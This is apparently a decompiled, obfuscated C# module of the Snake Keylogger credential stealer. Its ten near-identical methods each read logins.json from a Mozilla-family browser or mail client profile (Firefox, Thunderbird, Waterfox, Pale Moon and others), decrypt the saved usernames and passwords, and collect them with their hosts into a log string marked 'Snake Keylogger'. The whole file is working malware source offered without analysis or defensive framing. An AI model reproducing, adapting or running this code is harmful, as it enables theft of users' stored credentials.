using System;
using System.IO;
using System.Web.Script.Serialization;
using Microsoft.VisualBasic.CompilerServices;
using Ӛ2ا뫆Π;
using ݶ_FFFDՄ_061D_FFFD;

namespace 鈟_02F3ڿɩ_FFFD;

public class ɢ_FFFDӺ_06E8꼺
{
	private class FFLogins
	{
		public long nextId { get; set; }

		public aaalogshsindgdaLogndta[] logins { get; set; }

		public string[] disabledHosts { get; set; }

		public int version { get; set; }
	}

	private class aaalogshsindgdaLogndta
	{
		public long id { get; set; }

		public string hostname { get; set; }

		public string url { get; set; }

		public string httprealm { get; set; }

		public string formSubmitURL { get; set; }

		public string usernameField { get; set; }

		public string passwordField { get; set; }

		public string encryptedUsername { get; set; }

		public string encryptedPassword { get; set; }

		public string guid { get; set; }

		public int encType { get; set; }

		public long timeCreated { get; set; }

		public long timeLastUsed { get; set; }

		public long timePasswordChanged { get; set; }

		public long timesUsed { get; set; }
	}

	public static void Z꾯zŎ_FFFD()
	{
		//IL_00af: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		try
		{
			string text = null;
			string path = null;
			bool flag = false;
			bool flag2 = false;
			string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));
			string text2 = "";
			if (directories.Length == 0)
			{
			}
			string[] array = directories;
			foreach (string text3 in array)
			{
				string[] files = Directory.GetFiles(text3, "logins.json");
				if (files.Length > 0)
				{
					path = files[0];
					flag2 = true;
				}
				if (flag2)
				{
					Ԍ_002D_06E3嵱뜸.꾯盀ҢĪ_005E(text3);
					break;
				}
			}
			if (!flag2)
			{
				return;
			}
			FFLogins fFLogins;
			using (StreamReader streamReader = new StreamReader(path))
			{
				string text4 = streamReader.ReadToEnd();
				JavaScriptSerializer val = new JavaScriptSerializer();
				fFLogins = val.Deserialize<FFLogins>(text4);
			}
			aaalogshsindgdaLogndta[] logins = fFLogins.logins;
			foreach (aaalogshsindgdaLogndta aaalogshsindgdaLogndta in logins)
			{
				string text5 = "";
				string text6 = Ԍ_002D_06E3嵱뜸._0306ٷĂҏ븤(aaalogshsindgdaLogndta.encryptedUsername);
				string text7 = Ԍ_002D_06E3嵱뜸._0306ٷĂҏ븤(aaalogshsindgdaLogndta.encryptedPassword);
				string hostname = aaalogshsindgdaLogndta.hostname;
				text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Firefox\r\nHost: " + hostname + "\r\nUSR: " + text6 + "\r\nPSWD: " + text7 + "\r\n---------------------------------\r\n ";
				鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
			}
			Ԍ_002D_06E3嵱뜸.뫆ʭ_07B4Òk();
			foreach (IntPtr item in Ԍ_002D_06E3嵱뜸.ŔՕ_FFFD_FFFD늻)
			{
				Ԍ_002D_06E3嵱뜸.ҭjߟ_FFFDӥ(item);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static void _FFFD_D911_DEBAՄ䇹()
	{
		//IL_00af: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		try
		{
			string text = null;
			string path = null;
			bool flag = false;
			bool flag2 = false;
			string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Waterfox\\Profiles"));
			string text2 = "";
			if (directories.Length == 0)
			{
			}
			string[] array = directories;
			foreach (string text3 in array)
			{
				string[] files = Directory.GetFiles(text3, "logins.json");
				if (files.Length > 0)
				{
					path = files[0];
					flag2 = true;
				}
				if (flag2)
				{
					Ԍ_002D_06E3嵱뜸.꾯盀ҢĪ_005E(text3);
					break;
				}
			}
			if (!flag2)
			{
				return;
			}
			FFLogins fFLogins;
			using (StreamReader streamReader = new StreamReader(path))
			{
				string text4 = streamReader.ReadToEnd();
				JavaScriptSerializer val = new JavaScriptSerializer();
				fFLogins = val.Deserialize<FFLogins>(text4);
			}
			aaalogshsindgdaLogndta[] logins = fFLogins.logins;
			foreach (aaalogshsindgdaLogndta aaalogshsindgdaLogndta in logins)
			{
				string text5 = "";
				string text6 = Ԍ_002D_06E3嵱뜸._0306ٷĂҏ븤(aaalogshsindgdaLogndta.encryptedUsername);
				string text7 = Ԍ_002D_06E3嵱뜸._0306ٷĂҏ븤(aaalogshsindgdaLogndta.encryptedPassword);
				string hostname = aaalogshsindgdaLogndta.hostname;
				text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: WaterFox\r\nHost: " + hostname + "\r\nUSR: " + text6 + "\r\nPSWD: " + text7 + "\r\n---------------------------------\r\n ";
				鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
			}
			Ԍ_002D_06E3嵱뜸.뫆ʭ_07B4Òk();
			foreach (IntPtr item in Ԍ_002D_06E3嵱뜸.ŔՕ_FFFD_FFFD늻)
			{
				Ԍ_002D_06E3嵱뜸.ҭjߟ_FFFDӥ(item);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static void ҡRأیc()
	{
		//IL_00af: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		try
		{
			string text = null;
			string path = null;
			bool flag = false;
			bool flag2 = false;
			string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Thunderbird\\Profiles\\"));
			string text2 = "";
			if (directories.Length == 0)
			{
			}
			string[] array = directories;
			foreach (string text3 in array)
			{
				string[] files = Directory.GetFiles(text3, "logins.json");
				if (files.Length > 0)
				{
					path = files[0];
					flag2 = true;
				}
				if (flag2)
				{
					Ԍ_002D_06E3嵱뜸.꾯盀ҢĪ_005E(text3);
					break;
				}
			}
			if (!flag2)
			{
				return;
			}
			FFLogins fFLogins;
			using (StreamReader streamReader = new StreamReader(path))
			{
				string text4 = streamReader.ReadToEnd();
				JavaScriptSerializer val = new JavaScriptSerializer();
				fFLogins = val.Deserialize<FFLogins>(text4);
			}
			aaalogshsindgdaLogndta[] logins = fFLogins.logins;
			foreach (aaalogshsindgdaLogndta aaalogshsindgdaLogndta in logins)
			{
				string text5 = "";
				string text6 = Ԍ_002D_06E3嵱뜸._0306ٷĂҏ븤(aaalogshsindgdaLogndta.encryptedUsername);
				string text7 = Ԍ_002D_06E3嵱뜸._0306ٷĂҏ븤(aaalogshsindgdaLogndta.encryptedPassword);
				string hostname = aaalogshsindgdaLogndta.hostname;
				text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Thunderbird\r\nHost: " + hostname + "\r\nUSR: " + text6 + "\r\nPSWD: " + text7 + "\r\n---------------------------------\r\n ";
				鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
			}
			Ԍ_002D_06E3嵱뜸.뫆ʭ_07B4Òk();
			foreach (IntPtr item in Ԍ_002D_06E3嵱뜸.ŔՕ_FFFD_FFFD늻)
			{
				Ԍ_002D_06E3嵱뜸.ҭjߟ_FFFDӥ(item);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static void _FFFD_0300U_00ABΠ()
	{
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Expected O, but got Unknown
		try
		{
			string text = null;
			string path = null;
			bool flag = false;
			bool flag2 = false;
			string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\SeaMonkey\\Profiles"));
			string text2 = "";
			if (directories.Length == 0)
			{
				return;
			}
			string[] array = directories;
			foreach (string text3 in array)
			{
				string[] files = Directory.GetFiles(text3, "logins.json");
				if (files.Length > 0)
				{
					path = files[0];
					flag2 = true;
				}
				if (flag2)
				{
					Ԍ_002D_06E3嵱뜸.꾯盀ҢĪ_005E(text3);
					break;
				}
			}
			if (!flag2)
			{
				return;
			}
			FFLogins fFLogins;
			using (StreamReader streamReader = new StreamReader(path))
			{
				string text4 = streamReader.ReadToEnd();
				JavaScriptSerializer val = new JavaScriptSerializer();
				fFLogins = val.Deserialize<FFLogins>(text4);
			}
			aaalogshsindgdaLogndta[] logins = fFLogins.logins;
			foreach (aaalogshsindgdaLogndta aaalogshsindgdaLogndta in logins)
			{
				string text5 = "";
				string text6 = Ԍ_002D_06E3嵱뜸._0306ٷĂҏ븤(aaalogshsindgdaLogndta.encryptedUsername);
				string text7 = Ԍ_002D_06E3嵱뜸._0306ٷĂҏ븤(aaalogshsindgdaLogndta.encryptedPassword);
				string hostname = aaalogshsindgdaLogndta.hostname;
				text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: SeaMonkey\r\nHost: " + hostname + "\r\nUSR: " + text6 + "\r\nPSWD: " + text7 + "\r\n---------------------------------\r\n ";
				鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
			}
			Ԍ_002D_06E3嵱뜸.뫆ʭ_07B4Òk();
			foreach (IntPtr item in Ԍ_002D_06E3嵱뜸.ŔՕ_FFFD_FFFD늻)
			{
				Ԍ_002D_06E3嵱뜸.ҭjߟ_FFFDӥ(item);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static void _061Dş_FFFDÒ_00BE()
	{
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Expected O, but got Unknown
		try
		{
			string text = null;
			string path = null;
			bool flag = false;
			bool flag2 = false;
			string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Comodo\\IceDragon\\Profiles"));
			string text2 = "";
			if (directories.Length == 0)
			{
				return;
			}
			string[] array = directories;
			foreach (string text3 in array)
			{
				string[] files = Directory.GetFiles(text3, "logins.json");
				if (files.Length > 0)
				{
					path = files[0];
					flag2 = true;
				}
				if (flag2)
				{
					Ԍ_002D_06E3嵱뜸.꾯盀ҢĪ_005E(text3);
					break;
				}
			}
			if (!flag2)
			{
				return;
			}
			FFLogins fFLogins;
			using (StreamReader streamReader = new StreamReader(path))
			{
				string text4 = streamReader.ReadToEnd();
				JavaScriptSerializer val = new JavaScriptSerializer();
				fFLogins = val.Deserialize<FFLogins>(text4);
			}
			aaalogshsindgdaLogndta[] logins = fFLogins.logins;
			foreach (aaalogshsindgdaLogndta aaalogshsindgdaLogndta in logins)
			{
				string text5 = "";
				string text6 = Ԍ_002D_06E3嵱뜸._0306ٷĂҏ븤(aaalogshsindgdaLogndta.encryptedUsername);
				string text7 = Ԍ_002D_06E3嵱뜸._0306ٷĂҏ븤(aaalogshsindgdaLogndta.encryptedPassword);
				string hostname = aaalogshsindgdaLogndta.hostname;
				text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Ice Dragon\r\nHost: " + hostname + "\r\nUSR: " + text6 + "\r\nPSWD: " + text7 + "\r\n---------------------------------\r\n ";
				鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
			}
			Ԍ_002D_06E3嵱뜸.뫆ʭ_07B4Òk();
			foreach (IntPtr item in Ԍ_002D_06E3嵱뜸.ŔՕ_FFFD_FFFD늻)
			{
				Ԍ_002D_06E3嵱뜸.ҭjߟ_FFFDӥ(item);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static void _060C콪ƌЅ_FFFD()
	{
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Expected O, but got Unknown
		try
		{
			string text = null;
			string path = null;
			bool flag = false;
			bool flag2 = false;
			string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "8pecxstudios\\Cyberfox\\Profiles"));
			string text2 = "";
			if (directories.Length == 0)
			{
				return;
			}
			string[] array = directories;
			foreach (string text3 in array)
			{
				string[] files = Directory.GetFiles(text3, "logins.json");
				if (files.Length > 0)
				{
					path = files[0];
					flag2 = true;
				}
				if (flag2)
				{
					Ԍ_002D_06E3嵱뜸.꾯盀ҢĪ_005E(text3);
					break;
				}
			}
			if (!flag2)
			{
				return;
			}
			FFLogins fFLogins;
			using (StreamReader streamReader = new StreamReader(path))
			{
				string text4 = streamReader.ReadToEnd();
				JavaScriptSerializer val = new JavaScriptSerializer();
				fFLogins = val.Deserialize<FFLogins>(text4);
			}
			aaalogshsindgdaLogndta[] logins = fFLogins.logins;
			foreach (aaalogshsindgdaLogndta aaalogshsindgdaLogndta in logins)
			{
				string text5 = "";
				string text6 = Ԍ_002D_06E3嵱뜸._0306ٷĂҏ븤(aaalogshsindgdaLogndta.encryptedUsername);
				string text7 = Ԍ_002D_06E3嵱뜸._0306ٷĂҏ븤(aaalogshsindgdaLogndta.encryptedPassword);
				string hostname = aaalogshsindgdaLogndta.hostname;
				text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: CyberFox\r\nHost: " + hostname + "\r\nUSR: " + text6 + "\r\nPSWD: " + text7 + "\r\n---------------------------------\r\n ";
				鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
			}
			Ԍ_002D_06E3嵱뜸.뫆ʭ_07B4Òk();
			foreach (IntPtr item in Ԍ_002D_06E3嵱뜸.ŔՕ_FFFD_FFFD늻)
			{
				Ԍ_002D_06E3嵱뜸.ҭjߟ_FFFDӥ(item);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static void _2_FFFDή_FFFD߂()
	{
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Expected O, but got Unknown
		try
		{
			string text = null;
			string path = null;
			bool flag = false;
			bool flag2 = false;
			string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FlashPeak\\SlimBrowser\\Profiles"));
			string text2 = "";
			if (directories.Length == 0)
			{
				return;
			}
			string[] array = directories;
			foreach (string text3 in array)
			{
				string[] files = Directory.GetFiles(text3, "logins.json");
				if (files.Length > 0)
				{
					path = files[0];
					flag2 = true;
				}
				if (flag2)
				{
					Ԍ_002D_06E3嵱뜸.꾯盀ҢĪ_005E(text3);
					break;
				}
			}
			if (!flag2)
			{
				return;
			}
			FFLogins fFLogins;
			using (StreamReader streamReader = new StreamReader(path))
			{
				string text4 = streamReader.ReadToEnd();
				JavaScriptSerializer val = new JavaScriptSerializer();
				fFLogins = val.Deserialize<FFLogins>(text4);
			}
			aaalogshsindgdaLogndta[] logins = fFLogins.logins;
			foreach (aaalogshsindgdaLogndta aaalogshsindgdaLogndta in logins)
			{
				string text5 = "";
				string text6 = Ԍ_002D_06E3嵱뜸._0306ٷĂҏ븤(aaalogshsindgdaLogndta.encryptedUsername);
				string text7 = Ԍ_002D_06E3嵱뜸._0306ٷĂҏ븤(aaalogshsindgdaLogndta.encryptedPassword);
				string hostname = aaalogshsindgdaLogndta.hostname;
				text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Slim\r\nHost: " + hostname + "\r\nUSR: " + text6 + "\r\nPSWD: " + text7 + "\r\n---------------------------------\r\n ";
				鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
			}
			Ԍ_002D_06E3嵱뜸.뫆ʭ_07B4Òk();
			foreach (IntPtr item in Ԍ_002D_06E3嵱뜸.ŔՕ_FFFD_FFFD늻)
			{
				Ԍ_002D_06E3嵱뜸.ҭjߟ_FFFDӥ(item);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static void Ŏ_FFFD_2964_0314ņ()
	{
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Expected O, but got Unknown
		try
		{
			string text = null;
			string path = null;
			bool flag = false;
			bool flag2 = false;
			string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\icecat\\Profiles"));
			string text2 = "";
			if (directories.Length == 0)
			{
				return;
			}
			string[] array = directories;
			foreach (string text3 in array)
			{
				string[] files = Directory.GetFiles(text3, "logins.json");
				if (files.Length > 0)
				{
					path = files[0];
					flag2 = true;
				}
				if (flag2)
				{
					Ԍ_002D_06E3嵱뜸.꾯盀ҢĪ_005E(text3);
					break;
				}
			}
			if (!flag2)
			{
				return;
			}
			FFLogins fFLogins;
			using (StreamReader streamReader = new StreamReader(path))
			{
				string text4 = streamReader.ReadToEnd();
				JavaScriptSerializer val = new JavaScriptSerializer();
				fFLogins = val.Deserialize<FFLogins>(text4);
			}
			aaalogshsindgdaLogndta[] logins = fFLogins.logins;
			foreach (aaalogshsindgdaLogndta aaalogshsindgdaLogndta in logins)
			{
				string text5 = "";
				string text6 = Ԍ_002D_06E3嵱뜸._0306ٷĂҏ븤(aaalogshsindgdaLogndta.encryptedUsername);
				string text7 = Ԍ_002D_06E3嵱뜸._0306ٷĂҏ븤(aaalogshsindgdaLogndta.encryptedPassword);
				string hostname = aaalogshsindgdaLogndta.hostname;
				text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: IceCat\r\nHost: " + hostname + "\r\nUSR: " + text6 + "\r\nPSWD: " + text7 + "\r\n---------------------------------\r\n ";
				鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
			}
			Ԍ_002D_06E3嵱뜸.뫆ʭ_07B4Òk();
			foreach (IntPtr item in Ԍ_002D_06E3嵱뜸.ŔՕ_FFFD_FFFD늻)
			{
				Ԍ_002D_06E3嵱뜸.ҭjߟ_FFFDӥ(item);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static void _FFFDŚ_0332Ѕ_FFFD()
	{
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Expected O, but got Unknown
		try
		{
			string text = null;
			string path = null;
			bool flag = false;
			bool flag2 = false;
			string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "PostboxApp\\Profiles"));
			string text2 = "";
			if (directories.Length == 0)
			{
				return;
			}
			string[] array = directories;
			foreach (string text3 in array)
			{
				string[] files = Directory.GetFiles(text3, "logins.json");
				if (files.Length > 0)
				{
					path = files[0];
					flag2 = true;
				}
				if (flag2)
				{
					Ԍ_002D_06E3嵱뜸.꾯盀ҢĪ_005E(text3);
					break;
				}
			}
			if (!flag2)
			{
				return;
			}
			FFLogins fFLogins;
			using (StreamReader streamReader = new StreamReader(path))
			{
				string text4 = streamReader.ReadToEnd();
				JavaScriptSerializer val = new JavaScriptSerializer();
				fFLogins = val.Deserialize<FFLogins>(text4);
			}
			aaalogshsindgdaLogndta[] logins = fFLogins.logins;
			foreach (aaalogshsindgdaLogndta aaalogshsindgdaLogndta in logins)
			{
				string text5 = "";
				string text6 = Ԍ_002D_06E3嵱뜸._0306ٷĂҏ븤(aaalogshsindgdaLogndta.encryptedUsername);
				string text7 = Ԍ_002D_06E3嵱뜸._0306ٷĂҏ븤(aaalogshsindgdaLogndta.encryptedPassword);
				string hostname = aaalogshsindgdaLogndta.hostname;
				text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: PostBox\r\nHost: " + hostname + "\r\nUSR: " + text6 + "\r\nPSWD: " + text7 + "\r\n---------------------------------\r\n ";
				鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
			}
			Ԍ_002D_06E3嵱뜸.뫆ʭ_07B4Òk();
			foreach (IntPtr item in Ԍ_002D_06E3嵱뜸.ŔՕ_FFFD_FFFD늻)
			{
				Ԍ_002D_06E3嵱뜸.ҭjߟ_FFFDӥ(item);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static void ҏU_FFFD_060C_0040()
	{
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Expected O, but got Unknown
		try
		{
			string text = null;
			string path = null;
			bool flag = false;
			bool flag2 = false;
			string[] directories = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Moonchild Productions\\Pale Moon\\Profiles"));
			string text2 = "";
			if (directories.Length == 0)
			{
				return;
			}
			string[] array = directories;
			foreach (string text3 in array)
			{
				string[] files = Directory.GetFiles(text3, "logins.json");
				if (files.Length > 0)
				{
					path = files[0];
					flag2 = true;
				}
				if (flag2)
				{
					Ԍ_002D_06E3嵱뜸.꾯盀ҢĪ_005E(text3);
					break;
				}
			}
			if (!flag2)
			{
				return;
			}
			FFLogins fFLogins;
			using (StreamReader streamReader = new StreamReader(path))
			{
				string text4 = streamReader.ReadToEnd();
				JavaScriptSerializer val = new JavaScriptSerializer();
				fFLogins = val.Deserialize<FFLogins>(text4);
			}
			aaalogshsindgdaLogndta[] logins = fFLogins.logins;
			foreach (aaalogshsindgdaLogndta aaalogshsindgdaLogndta in logins)
			{
				string text5 = "";
				string text6 = Ԍ_002D_06E3嵱뜸._0306ٷĂҏ븤(aaalogshsindgdaLogndta.encryptedUsername);
				string text7 = Ԍ_002D_06E3嵱뜸._0306ٷĂҏ븤(aaalogshsindgdaLogndta.encryptedPassword);
				string hostname = aaalogshsindgdaLogndta.hostname;
				text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: PaleMoon\r\nHost: " + hostname + "\r\nUSR: " + text6 + "\r\nPSWD: " + text7 + "\r\n---------------------------------\r\n ";
				鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
			}
			Ԍ_002D_06E3嵱뜸.뫆ʭ_07B4Òk();
			foreach (IntPtr item in Ԍ_002D_06E3嵱뜸.ŔՕ_FFFD_FFFD늻)
			{
				Ԍ_002D_06E3嵱뜸.ҭjߟ_FFFDӥ(item);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}
}
